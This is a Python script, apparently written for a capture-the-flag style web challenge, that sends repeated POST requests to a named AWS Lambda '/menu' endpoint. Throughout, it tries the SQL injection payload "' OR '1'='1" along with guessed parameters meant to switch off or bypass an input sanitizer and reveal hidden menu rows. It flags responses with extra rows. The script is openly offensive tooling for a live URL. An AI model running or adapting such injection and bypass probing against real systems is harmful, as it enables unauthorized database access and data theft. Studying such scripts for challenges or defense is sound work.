import requests
from urllib.parse import quote

def test_request(data_dict):
    url = "https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws/menu"
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    
    # Convert dict to form data
    data = "&".join(f"{key}={quote(value)}" for key, value in data_dict.items())
    
    try:
        response = requests.post(url, headers=headers, data=data)
        print(f"\nTesting parameters: {data_dict}")
        print("Response length:", len(response.text))
        if "Results:" in response.text:
            print("Got results table!")
            if response.text.count("<tr>") != 4:  # Different than default 3 rows + header
                print("Different number of rows found!")
            print(response.text)
        return response.text
    except Exception as e:
        print(f"Error occurred: {e}")
        return None

# Test cases with different parameter combinations
test_cases = [
    # Test different parameter names
    {"sanitized_query": "' OR '1'='1"},
    {"clean_query": "' OR '1'='1"},
    {"sanitize_query": "' OR '1'='1"},
    {"sanitizer": "' OR '1'='1"},
    
    # Multiple parameters
    {"query": "' OR '1'='1", "sanitize": "true"},
    {"query": "' OR '1'='1", "clean": "true"},
    {"query": "' OR '1'='1", "sanitized": "true"},
    
    # Testing sanitization bypass
    {"query": "Hamburger", "bypass_sanitize": "true"},
    {"query": "Hamburger", "no_sanitize": "true"},
    {"query": "Hamburger", "raw": "true"},
    
    # Testing different cases
    {"QUERY": "' OR '1'='1"},
    {"Query": "' OR '1'='1"},
    
    # Testing special parameters
    {"special": "true"},
    {"special_menu": "true"},
    {"show_special": "true"},
    
    # Combining techniques
    {"query": "Hamburger", "special": "true", "sanitize": "false"},
    {"query": "' OR '1'='1", "show_hidden": "true"},
    {"query": "' OR '1'='1", "raw_query": "true"},
    
    # Testing sanitizer-related parameters
    {"sanitizer_level": "0", "query": "' OR '1'='1"},
    {"disable_sanitizer": "true", "query": "' OR '1'='1"},
    {"sanitizer_bypass": "true", "query": "' OR '1'='1"},
    
    # Try array-like parameters
    {"query[]": "' OR '1'='1"},
    {"query[sanitize]": "false"},
    
    # Testing with empty and special values
    {"query": "", "special": "true"},
    {"": "' OR '1'='1"},
    {" ": "' OR '1'='1"},
]

def main():
    print("Starting parameter manipulation tests...")
    for test_case in test_cases:
        result = test_request(test_case)
        if result and "Hamburger" not in result:
            print("Unusual response found!")
        print("\nPress Enter to continue, 'q' to quit...")
        if input().lower() == 'q':
            break

if __name__ == "__main__":
    main()